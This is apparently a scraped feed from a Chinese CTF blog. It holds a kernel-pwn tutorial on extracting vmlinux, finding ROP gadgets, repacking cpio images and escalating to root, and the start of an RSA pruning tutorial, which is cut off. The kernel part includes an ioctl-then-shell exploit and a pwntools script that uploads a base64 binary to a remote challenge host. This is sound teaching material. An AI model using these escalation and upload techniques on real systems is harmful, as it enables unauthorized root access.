plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wget https://raw.githubusercontent.com/torvalds/linux/master/scripts/extract-vmlinux</span><br></pre></td></tr></table></figure><ul><li>先chmod给执行权限</li><li>然后执行命令，即可解压，注意本题解压这个<code>bzImage</code>文件会出现<code>extract-vmlinux: Cannot find vmlinux.</code><ul><li>所以我换了一个<code>CISCN2017-babydriver</code>的<code>bzImage</code>进行解压</li></ul></li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./extract-vmlinux ./bzImage &gt; vmlinux</span><br></pre></td></tr></table></figure><p><img src="/2025/05/03/CTFblog/PWN%E7%B3%BB%E5%88%97blog/Linux_pwn/3.%E5%86%85%E6%A0%B8%E7%B3%BB%E5%88%97/%E5%86%85%E6%A0%B8pwn%E5%85%A5%E9%97%A8/image-20240909194322389.png" alt="image-20240909194322389"></p><h1 id="安装使用ropper"><a class="markdownIt-Anchor" href="#安装使用ropper"></a> 安装使用Ropper</h1><ul><li>安装<code>Ropper</code></li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pip3 install ropper</span><br></pre></td></tr></table></figure><ul><li>下载好后输入命令，看看Ropper是否安装好了</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ropper --help</span><br></pre></td></tr></table></figure><p><img src="/2025/05/03/CTFblog/PWN%E7%B3%BB%E5%88%97blog/Linux_pwn/3.%E5%86%85%E6%A0%B8%E7%B3%BB%E5%88%97/%E5%86%85%E6%A0%B8pwn%E5%85%A5%E9%97%A8/image-20240909195418256.png" alt="image-20240909195418256"></p><ul><li>使用如下命令查找<code>rop</code>链</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ropper --file vmlinux</span><br></pre></td></tr></table></figure><p><img src="/2025/05/03/CTFblog/PWN%E7%B3%BB%E5%88%97blog/Linux_pwn/3.%E5%86%85%E6%A0%B8%E7%B3%BB%E5%88%97/%E5%86%85%E6%A0%B8pwn%E5%85%A5%E9%97%A8/image-20240909195715902.png" alt="image-20240909195715902"></p><ul><li>过滤和排序 ROP gadgets，过程很慢，因为文件量很大</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ropper --file vmlinux --search <span class="string">&quot;pop&quot;</span></span><br><span class="line"><span class="comment"># 要将结果导出到文件，可以使用 -o 选项</span></span><br><span class="line">ropper --file vmlinux --gadgets <span class="string">&quot;pop&quot;</span> -o gadgets.txt</span><br></pre></td></tr></table></figure><h1 id="打包cpio文件"><a class="markdownIt-Anchor" href="#打包cpio文件"></a> 打包.cpio文件</h1><ul><li>打包.cpio文件过程如下，现在模拟一下编写好<code>exp</code>如何进行提权。</li><li><code>.cpio</code>文件可以直接用zip等解压，也可以在Linux下使用<code>cpio</code>命令解压</li></ul><img src="/2025/05/03/CTFblog/PWN%E7%B3%BB%E5%88%97blog/Linux_pwn/3.%E5%86%85%E6%A0%B8%E7%B3%BB%E5%88%97/%E5%86%85%E6%A0%B8pwn%E5%85%A5%E9%97%A8/image-20240909185804531.png" alt="image-20240909185804531" style="zoom:50%;"><ul><li>在Linux下解压cpio文件，需要先创建一个文件夹用来存放解压后的文件，因为使用cpio指令解压后的文件是分散的。</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mkdir rootfs</span><br></pre></td></tr></table></figure><ul><li>然后进入该文件夹</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cd rootfs</span><br></pre></td></tr></table></figure><ul><li>进入文件夹后使用cpio命令解压cpio文件</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cpio -id &lt; ../rootfs.cpio</span><br></pre></td></tr></table></figure><p><code>-i</code>：解包模式。</p><p><code>-d</code>：在解包过程中创建目录。</p><p><code>&lt; archive.cpio</code>：从 <code>archive.cpio</code> 文件中读取数据。</p><ul><li>先将编写好的exp进行静态编译一下，然后编译成为二进制的文件，放入解压后的<code>.cpio</code>文件中，然后</li></ul><p><img src="/2025/05/03/CTFblog/PWN%E7%B3%BB%E5%88%97blog/Linux_pwn/3.%E5%86%85%E6%A0%B8%E7%B3%BB%E5%88%97/%E5%86%85%E6%A0%B8pwn%E5%85%A5%E9%97%A8/image-20240909185822096.png" alt="image-20240909185822096"></p><ul><li>然后在Linux下输入该命令</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find ./rootfs1 -<span class="built_in">print</span> | cpio -ov &gt; rootfs1.cpio</span><br></pre></td></tr></table></figure><h1 id="查看ko文件的保护"><a class="markdownIt-Anchor" href="#查看ko文件的保护"></a> 查看.ko文件的保护</h1><ul><li><p><code>ko</code>是内核题比较重要的文件，有时候漏洞可能就是由这里面的代码造成的，所以会存在一些保护机制，这就需要查看一下保护机制</p></li><li><p>就直接使用<code>checksec</code>查看保护就行</p></li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">checksec test.ko</span><br></pre></td></tr></table></figure><p><img src="/2025/05/03/CTFblog/PWN%E7%B3%BB%E5%88%97blog/Linux_pwn/3.%E5%86%85%E6%A0%B8%E7%B3%BB%E5%88%97/%E5%86%85%E6%A0%B8pwn%E5%85%A5%E9%97%A8/image-20240909201033331.png" alt="image-20240909201033331"></p><h1 id="漏洞利用"><a class="markdownIt-Anchor" href="#漏洞利用"></a> 漏洞利用</h1><h2 id="提权"><a class="markdownIt-Anchor" href="#提权"></a> 提权</h2><ul><li><p>cred结构体：kernel使用cred结构体记录了进程的权限，如果能劫持或伪造cred结构体，就能改变当前进程的权限。（这里可能不太详细，之后再来补充）</p></li><li><p>Linux源码网站：<a href="https://mirrors.edge.kernel.org/pub/linux/kernel/">/pub/linux/kernel/ 的索引</a></p></li><li><p>查看源码，我查看的内核版本是<code>linux-6.9</code>版本的内核，然后<code>cred</code>结构体在<code>include/linux/cred.h</code>文件下</p><ul><li>一般而言，我们需要想办法将uid和gid设置为0（root的uid和gid均为0）</li><li>在 Linux 操作系统中，UID（User Identifier，用户标识符）是一个唯一的整数，用于标识系统中的每个用户账户。</li><li>在 Linux 操作系统中，GID（Group Identifier，组标识符）是一个唯一的整数，用于标识系统中的每个组。</li></ul></li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * The security context of a task</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * The parts of the context break down into two categories:</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> *  (1) The objective context of a task.  These parts are used when some other</span></span><br><span class="line"><span class="comment"> *task is attempting to affect this one.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> *  (2) The subjective context.  These details are used when the task is acting</span></span><br><span class="line"><span class="comment"> *upon another object, be that a file, a task, a key or whatever.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * Note that some members of this structure belong to both categories - the</span></span><br><span class="line"><span class="comment"> * LSM security pointer for instance.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * A task has two security pointers.  task-&gt;real_cred points to the objective</span></span><br><span class="line"><span class="comment"> * context that defines that task&#x27;s actual details.  The objective part of this</span></span><br><span class="line"><span class="comment"> * context is used whenever that task is acted upon.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * task-&gt;cred points to the subjective context that defines the details of how</span></span><br><span class="line"><span class="comment"> * that task is going to act upon another object.  This may be overridden</span></span><br><span class="line"><span class="comment"> * temporarily to point to another security context, but normally points to the</span></span><br><span class="line"><span class="comment"> * same context as task-&gt;real_cred.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">cred</span> &#123;</span></span><br><span class="line"><span class="type">atomic_long_t</span>usage;</span><br><span class="line"><span class="type">kuid_t</span>uid;<span class="comment">/* real UID of the task */</span></span><br><span class="line"><span class="type">kgid_t</span>gid;<span class="comment">/* real GID of the task */</span></span><br><span class="line"><span class="type">kuid_t</span>suid;<span class="comment">/* saved UID of the task */</span></span><br><span class="line"><span class="type">kgid_t</span>sgid;<span class="comment">/* saved GID of the task */</span></span><br><span class="line"><span class="type">kuid_t</span>euid;<span class="comment">/* effective UID of the task */</span></span><br><span class="line"><span class="type">kgid_t</span>egid;<span class="comment">/* effective GID of the task */</span></span><br><span class="line"><span class="type">kuid_t</span>fsuid;<span class="comment">/* UID for VFS ops */</span></span><br><span class="line"><span class="type">kgid_t</span>fsgid;<span class="comment">/* GID for VFS ops */</span></span><br><span class="line"><span class="type">unsigned</span>securebits;<span class="comment">/* SUID-less security management */</span></span><br><span class="line"><span class="type">kernel_cap_t</span>cap_inheritable; <span class="comment">/* caps our children can inherit */</span></span><br><span class="line"><span class="type">kernel_cap_t</span>cap_permitted;<span class="comment">/* caps we&#x27;re permitted */</span></span><br><span class="line"><span class="type">kernel_cap_t</span>cap_effective;<span class="comment">/* caps we can actually use */</span></span><br><span class="line"><span class="type">kernel_cap_t</span>cap_bset;<span class="comment">/* capability bounding set */</span></span><br><span class="line"><span class="type">kernel_cap_t</span>cap_ambient;<span class="comment">/* Ambient capability set */</span></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_KEYS</span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">char</span>jit_keyring;<span class="comment">/* default keyring to attach requested</span></span><br><span class="line"><span class="comment"> * keys to */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">key</span>*<span class="title">session_keyring</span>;</span> <span class="comment">/* keyring inherited over fork */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">key</span>*<span class="title">process_keyring</span>;</span> <span class="comment">/* keyring private to this process */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">key</span>*<span class="title">thread_keyring</span>;</span> <span class="comment">/* keyring private to this thread */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">key</span>*<span class="title">request_key_auth</span>;</span> <span class="comment">/* assumed request_key authority */</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_SECURITY</span></span><br><span class="line"><span class="type">void</span>*security;<span class="comment">/* LSM security */</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">user_struct</span> *<span class="title">user</span>;</span><span class="comment">/* real user ID subscription */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">user_namespace</span> *<span class="title">user_ns</span>;</span> <span class="comment">/* user_ns the caps and keyrings are relative to. */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">ucounts</span> *<span class="title">ucounts</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">group_info</span> *<span class="title">group_info</span>;</span><span class="comment">/* supplementary groups for euid/fsgid */</span></span><br><span class="line"><span class="comment">/* RCU deletion */</span></span><br><span class="line"><span class="class"><span class="keyword">union</span> &#123;</span></span><br><span class="line"><span class="type">int</span> non_rcu;<span class="comment">/* Can we skip RCU deletion? */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">rcu_head</span><span class="title">rcu</span>;</span><span class="comment">/* RCU deletion hook */</span></span><br><span class="line">&#125;;</span><br><span class="line">&#125; __randomize_layout;</span><br></pre></td></tr></table></figure><h2 id="本地打内核"><a class="markdownIt-Anchor" href="#本地打内核"></a> 本地打内核</h2><ul><li>用c写exp然后静态编译成可执行文件，再添加到cpio文件夹下，然后启动环境，运行exp，如果<code>exp</code>能通运行之后就是<code>root</code>权限，就有权限去打开<code>flag</code>文件</li><li>在使用静态编译的时候，建议使用<code>musl-gcc</code>进行静态编译，这样编译后的文件会比较小。一般来说简单的<code>exp.c</code>编译后的文件大小为<code>几十kb</code></li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">musl-gcc -static -Os -o bout bout.c</span><br></pre></td></tr></table></figure><ul><li>如果使用<code>gcc</code>进行静态编译，原本<code>几十kb</code>的文件就会变成<code>几百kb</code>，这样在发送这个文件到远程的时候就会出现发包量太大，从而导致一些包丢了，远程就利用不了。</li><li>接下来就是一个简单的<code>exp.c</code>文件的例子：</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;sys/ioctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">        <span class="type">int</span> fd1 = open(<span class="string">&quot;/dev/fafu_module&quot;</span>,O_RDONLY);</span><br><span class="line">        ioctl(fd1,<span class="number">0xFAF</span>);</span><br><span class="line">        system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="远程打内核"><a class="markdownIt-Anchor" href="#远程打内核"></a> 远程打内核</h2><ul><li><p>远程打内核还是使用<code>python</code>写脚本进行漏洞利用，但是我们要用到之前编译好的<code>exp</code>文件。一般来说在远程的系统上都会有<code>echo</code>和<code>base64 -d</code>这个命令。</p></li><li><p>这时我们就需要将编译好的<code>exp</code>文件，使用<code>base64</code>编码，使用命令将这一堆<code>base64</code>放到远程靶机的一个文件中。</p></li><li><p>然后再使用将该文件的base64全部解码到另一个文件中</p></li><li><p>这时我们再使用<code>chmod</code>命令将远程的这个可执行文件赋予可执行权限，执行该文件后我们就成功提权了。</p></li><li><p>这里给出一个例子。</p></li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line">os.environ[<span class="string">&#x27;PWNLIB_NOTERM&#x27;</span>] = <span class="string">&#x27;1&#x27;</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#context.log_level = &#x27;critical&#x27;</span></span><br><span class="line">p = remote(<span class="string">&quot;node5.anna.nssctf.cn&quot;</span>,<span class="number">29203</span>)</span><br><span class="line">sleep(<span class="number">5</span>)</span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;./exp&#x27;</span>,<span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    data = f.read()</span><br><span class="line">    encoded = base64.b64encode(data)</span><br><span class="line">encoded = <span class="built_in">str</span>(encoded)[<span class="number">2</span>:-<span class="number">1</span>]</span><br><span class="line"><span class="built_in">print</span>(encoded)</span><br><span class="line"><span class="comment">#p.sendline(b&#x27;echo -n &quot;%s&quot; &gt;&gt; ./benc&#x27;%(b&#x27;aaaa&#x27;))</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="built_in">len</span>(encoded),<span class="number">1000</span>):</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;%d / %d&#x27;</span> % (i, <span class="built_in">len</span>(encoded)))</span><br><span class="line">    p.sendline(<span class="string">b&#x27;echo -n \&quot;%s\&quot; &gt;&gt; ./benc&#x27;</span>%(encoded[i:i+<span class="number">1000</span>].encode(<span class="string">&quot;utf-8&quot;</span>)))</span><br><span class="line">    sleep(<span class="number">0.2</span>)</span><br><span class="line">p.sendline(<span class="string">b&quot;cat ./benc | base64 -d &gt; ./bout&quot;</span>)</span><br><span class="line">p.sendline(<span class="string">b&quot;chmod +x ./bout&quot;</span>)</span><br><span class="line"><span class="comment">#p.recvuntil(b&#x27;chmod +x ./bout&#x27;)</span></span><br><span class="line"><span class="comment">#context.log_level = &#x27;debug&#x27;</span></span><br><span class="line"><span class="comment">#p.sendline(&quot;./bout&quot;)</span></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><ul><li>exp利用效果如下：</li></ul><p><img src="/2025/05/03/CTFblog/PWN%E7%B3%BB%E5%88%97blog/Linux_pwn/3.%E5%86%85%E6%A0%B8%E7%B3%BB%E5%88%97/%E5%86%85%E6%A0%B8pwn%E5%85%A5%E9%97%A8/image-20250504184242235.png" alt="image-20250504184242235"></p><ul><li>运行<code>exp</code>后就可以提权了</li></ul><p><img src="/2025/05/03/CTFblog/PWN%E7%B3%BB%E5%88%97blog/Linux_pwn/3.%E5%86%85%E6%A0%B8%E7%B3%BB%E5%88%97/%E5%86%85%E6%A0%B8pwn%E5%85%A5%E9%97%A8/image-20250504184308185.png" alt="image-20250504184308185"></p><p><img src="/2025/05/03/CTFblog/PWN%E7%B3%BB%E5%88%97blog/Linux_pwn/3.%E5%86%85%E6%A0%B8%E7%B3%BB%E5%88%97/%E5%86%85%E6%A0%B8pwn%E5%85%A5%E9%97%A8/image-20250504184319732.png" alt="image-20250504184319732"></p><h2 id="远程接收问题"><a class="markdownIt-Anchor" href="#远程接收问题"></a> 远程接收问题</h2><ul><li>在打内核的时候会碰到远程接收问题，也就是在py脚本中如果没有设置一个环境变量，就会导致在接收的时候出现如下无回显的问题。</li></ul><p><img src="/2025/05/03/CTFblog/PWN%E7%B3%BB%E5%88%97blog/Linux_pwn/3.%E5%86%85%E6%A0%B8%E7%B3%BB%E5%88%97/%E5%86%85%E6%A0%B8pwn%E5%85%A5%E9%97%A8/image-20250504184648306.png" alt="image-20250504184648306"></p><ul><li>这个时候我们就需要再导入<code>pwntools</code>这个模块之前设置环境变量：<code>os.environ['PWNLIB_NOTERM'] = '1'</code>，具体如下：</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line">os.environ[<span class="string">&#x27;PWNLIB_NOTERM&#x27;</span>] = <span class="string">&#x27;1&#x27;</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br></pre></td></tr></table></figure><ul><li>设置完这个环境变量之后就可以解决这个问题</li></ul><p><img src="/2025/05/03/CTFblog/PWN%E7%B3%BB%E5%88%97blog/Linux_pwn/3.%E5%86%85%E6%A0%B8%E7%B3%BB%E5%88%97/%E5%86%85%E6%A0%B8pwn%E5%85%A5%E9%97%A8/image-20250504191354682.png" alt="image-20250504191354682"></p>]]></content>
    
    
    <summary type="html">前言：好像不是PWN不动，是不想做堆题QAQ</summary>
    
    
    
    <category term="CTF" scheme="http://iyheart.github.io/categories/CTF/"/>
    
    <category term="PWN" scheme="http://iyheart.github.io/categories/CTF/PWN/"/>
    
    
  </entry>
  
  <entry>
    <title>RSA剪枝</title>
    <link href="http://iyheart.github.io/2025/04/23/CTFblog/CRYPTO%E7%B3%BB%E5%88%97blog/RSA%E5%89%AA%E6%9E%9D/"/>
    <id>http://iyheart.github.io/2025/04/23/CTFblog/CRYPTO%E7%B3%BB%E5%88%97blog/RSA%E5%89%AA%E6%9E%9D/</id>
    <published>2025-04-23T01:30:36.000Z</published>
    <updated>2025-05-13T08:16:42.949Z</updated>
    
    <content type="html"><![CDATA[<ul><li>在<code>RSA</code>加密中有这么一类题型，这类题型的特征会给出<code>p异或q</code>的值。大一的时候在比赛中就经常看到，能搜索到博客，但是看到博客时发现需要用上深度搜索。就没去仔细学下去，也不想直接照抄脚本。</li><li>到现在发现这类的深度搜索其实不难，现在就来学习一下。</li><li>参考博客：<a href="https://tangcuxiaojikuai.xyz/post/342113ee.html">Crypto趣题-剪枝 | 糖醋小鸡块的blog</a></li></ul><h1 id="基础知识"><a class="markdownIt-Anchor" href="#基础知识"></a> 基础知识</h1><ul><li>这个其实涉及到<code>深度搜索</code>，所以我们需要先了解一下这个算法的基本思想。再从算法到<code>RSA</code>这类题型的剪枝。深度搜索其实就是一个思想，先往其中一种情况深入搜索，当这种情况搜索完发现满足条件，或者搜索的这种情况不满足条件，都会回退一步，往另一种情况搜索。</li><li>一般<code>深度搜索</code>都是采用递归的形式。现在给出深度搜索的一个编程模型。如果要详细了解深度搜索，建议还是去看算法。（注意有的时候并不存在<code>for</code>循环）</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">dfs</span><span class="params">(<span class="type">int</span> step)</span></span><br><span class="line">&#123;</span><br><span class="line">判断条件条件不满足直接返回;</span><br><span class="line">判断是否符合可能,符合可能就输出后返回;</span><br><span class="line"></span><br><span class="line">尝试每种可能 <span class="keyword">for</span>(i=<span class="number">1</span>;i&lt;=n;i++)</span><br><span class="line">&#123;</span><br><span class="line">继续下一步 dfs(step+<span class="number">1</span>)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">返回</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>解决这个编程问题后，现在就回归到了数学问题，也就是我们要寻找题目中的一些条件，我们需要题目的一些条件：<ul><li>确定搜索的范围和方式</li><li>确定判断条件</li><li>确定我们想要的可能</li></ul></li></ul><h1 id="方法1高位剪枝"><a class="markdownIt-Anchor" href="#方法1高位剪枝"></a> 方法1—高位剪枝</h1><ul><li>先掌握方法，再归纳题型。</li></ul><h1 id="方法2低位剪枝"><a class="markdownIt-Anchor" href="#方法2低位剪枝"></a> 方法2—低位剪枝</h1><h1 id="方法3首尾剪枝"><a class="markdownIt-Anchor" href="#方法3首尾剪枝"></a> 方法3—首尾剪枝</h1><ul><li></li></ul><h1 id="方法4特殊剪枝"><a class="markdownIt-Anchor" href="#方法4特殊剪枝"></a> 方法4—特殊剪枝</h1><h1 id="题型1_已知n和pq"><a class="markdownIt-Anchor" href="#题型1_已知n和pq"></a> 题型1_已知n和p^q</h1><ul><li><p>接下来就直接看题。</p></li><li><p>题目如下：</p></li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line">p = getPrime(<span class="number">512</span>)</span><br><span class="line">q = getPrime(<span class="number">512</span>)</span><br><span class="line"><span class="keyword">import</span> uuid</span><br><span class="line">flag = <span class="string">b&#x27;flag&#123;&#x27;</span> + <span class="built_in">str</span>(uuid.uuid4()).encode(<span class="string">&#x27;utf-8&#x27;</span>) +<span class="string">b&#x27;&#125;&#x27;</span></span><br><span class="line">m = bytes_to_long(flag)</span><br><span class="line">n = p*q</span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line">c = <span class="built_in">pow</span>(m,e,n)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;c =&quot;</span>,c)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;e =&quot;</span>,e)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;n =&quot;</span>,n)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;pxorq=&quot;</span>,p^q)</span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">c = 66392304950908878492363710070870951531455545751319561148342067457877398782558949718991790201052777075114258165343597322227423312133870924910093734510606640836588043251561979406140627180220409104790289197279651367750150961609680446724982983006836015046568723770416495789041264015005955613063446430704046342541</span></span><br><span class="line"><span class="string">e = 65537</span></span><br><span class="line"><span class="string">n = 108441959144783466019949523499775610834720941613924397283976591029507379036773190737681785553451219224390021126115393524892418373642573838193766663870298419018522866484967864033823662130197017420489851681081822197157446811086780203044600471496440854774133957717397970303786868281088943155384798141132782605963</span></span><br><span class="line"><span class="string">pxorq= 5365823686462750525081057734877193164653044160825672347607373204558980418392160718932907290867433329472424553303252786076257554667653255425933498955296218</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br></pre></td></tr></table></figure><ul><li>接下来查看一下题目给出的关键条件，即<code>pxorq</code></li></ul><p class="katex-block"><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><mi>p</mi><mi>x</mi><mi>o</mi><mi>r</mi><mi>q</mi><mo>=</mo><mi>p</mi><mo>⊕</mo><mi>q</mi></mrow><annotation encoding="application/x-tex">pxorq = p \oplus q</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.19444em;"></span><span class="mord mathnormal">p</span><span class="mord mathnormal">x</span><span class="mord mathnormal">o</span><span class="mord mathnormal" style="margin-right:0.02778em;">r</span><span class="mord mathnormal" style="margin-right:0.03588em;">q</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.7777700000000001em;vertical-align:-0.19444em;"></span><span class="mord mathnormal">p</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">⊕</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.19444em;"></span><span class="mord mathnormal" style="margin-right:0.03588em;">q</span></span></span></span></span></p><ul><li><strong>确定搜索方式</strong>：这时我们就会发现我们不能直接由<code>pxorq</code>恢复<code>p、q</code>，这时我们一位一位的查看，条件如下。这时我们便确定了搜索的方式(条件)</li></ul><p class="katex-block"><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mtable rowspacing="0.15999999999999992em" columnalign="left" columnspacing="1em"><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><mn>1.</mn><mtext>对于这</mtext><mn>512</mn><mtext>位中的每一位</mtext><mo 